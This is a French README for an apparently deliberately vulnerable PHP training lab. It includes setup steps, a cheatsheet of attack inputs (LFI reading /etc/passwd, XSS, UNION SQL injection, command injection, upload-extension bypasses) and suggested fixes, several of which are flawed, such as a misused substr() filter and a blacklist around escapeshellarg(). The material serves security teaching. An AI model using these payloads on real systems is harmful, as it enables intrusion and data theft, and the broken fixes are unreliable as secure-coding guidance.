# Installation
 LAMP basique...

```
sudo apt install apache2 php libapache2-mod-php mysql-server php-mysql
```
déplacer dossier vers /var/www/html

script.sql pour database

```
sudo mkdir /var/www/html/upload/
sudo chmod -R 777 /var/www/html/upload => right in folder
```


# Cheatsheet
<details>
<summary> Click me</summary>

## Broken authentication
Level 1
admin:password

- weak password
- default password
- GET parameters


Level 2

alice:123456789

- error message


## Broken Access Control
?sessionid=120983


## LFI

?topic=../../../../../../etc/passwd
?topic=php://filter/convert.base64-encode/resource=secret.php

## XSS
Level 1
<script>alert('XSS')</script>

Level 2
<script>alert('XSS')</script>

Modifier le contenu du premier message : 
<script>document.getElementsByTagName("p").item(1).innerHTML="Modifié par un hacker"</script>

Level 3 
Uniquement pseudo

Level 4
<img src="x" onerror="alert('XSS')"/>


## SQLi
Level 1
' or 1=1; -- 
a

admin' and 1=1; -- 
Level 2
uniquement password 
' or 1=1; --


Level 3
' union select null; -- 
' union select 'a','b','c','d'; -- 
' UNION select null, table_name,null,null from information_schema.tables; -- 
' UNION select null, column_name,null,null from information_schema.comluns where table_name='sql1'; -- 
' union select null,username,password,null from table='sql1'; --


## Command injection
Level 1
google.fr; ls


Level 2
google.fr" && ls #

## PHP file upload
try to upload .php3, .php4, .php5, .phtml...

5 secrets : 


1 - fuzzing 
secret.php

robots.txt => /96bd94aa09f61018abeaf0cd7b7c6387.php

code source => 33a2838ab91f7f01a24da38cb55cae10.php

?topic=php://filter/convert.base64-encode/resource=secret.php

Extract .git with GitTools
git restore .

</details>

# Fixs

<details>
<summary>Click me</summary>

## Broken auth
Level 1 
$_POST au lieu de  $_GET
Changer mot de passe

Level 2
retirer le message d'erreur 'l'utilisateur 'admin' n'existe pas'

Level 3
Faire le hash sha256 coté serveur et non coté client
! ne jamais faire confiance au front


## XSS
`htmlentities()` ou `htmlspecialchars()`

## LFI

```
<a class="btn" href="1.php?topic=fr"> Français</a>
<a class="btn" href="1.php?topic=en">Anglais</a>
<br>
<p>
<?php
if (isset($_GET['topic'])) {
    $topic = substr('../', '', $_GET['topic']);
    include('context'.$topic.'.txt');
}
?>
```
## SQLi 
requête preparée

```
  $stmt = $conn->prepare("SELECT * FROM sql1 WHERE username = ? AND password = ?");
  $stmt->bind_param("ss", $username, $password);
  $stmt->execute();
  $result = $stmt->get_result();
```

## Command injection 
```
        if (strstr($_REQUEST['host'], ';') || strstr($_REQUEST['host'], '|') || strstr($_REQUEST['host'], '&') || strstr($_REQUEST['host'], '>') || strstr($_REQUEST['host'], '<')) {
            $result = "Attaque detectée !";
        } else {
            $cmd = 'ping -c 4 "'.escapeshellarg($_POST['host']).'" 2>&1';
            $result = system($cmd);
        }
```

## File upload 
```
    $mime_type = mime_content_type($_FILES['file']['tmp_name']);
    $allowed_file_types = ['image/png', 'image/jpeg', 'plain/text'];
    if (! in_array($mime_type, $allowed_file_types)) {
        // File type is NOT allowed.
    }
```

</details>